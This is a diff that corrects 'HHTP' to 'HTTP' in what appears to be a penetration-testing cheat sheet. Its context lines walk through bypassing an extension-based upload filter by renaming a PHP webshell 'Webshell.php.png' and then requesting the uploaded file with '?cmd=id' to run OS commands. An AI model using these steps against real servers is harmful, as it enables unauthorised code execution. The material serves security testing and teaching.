@@ -346,8 +346,7 @@ Example
           You tried to upload a php webshell named "Webshell.php" but it is rejected (only .png, .gif and .jpg files are accepted)
 
 ➤ Step 2. Simply modify the file extension of your webshell like "Webshell.php.png" to 'bypass' the file format check based on the file extension
-          - Using Burp proxy send the following POST HHTP request:
-	  
+          - Using Burp proxy send the following POST HTTP request:
             POST /application/image_upload.php HTTP/1.1
             Host: x.x.x.x
             User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -387,8 +386,7 @@ Example
             </html>
 
 ➤ Step 3. Browse your webshell and execute OS commands 
-          - Using Burp proxy send the following POST HHTP request:
-
+          - Using Burp proxy send the following POST HTTP request:
             GET /application/uploads/Webshell.php.png?cmd=id HTTP/1.1
             Host: x.x.x.x
             User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
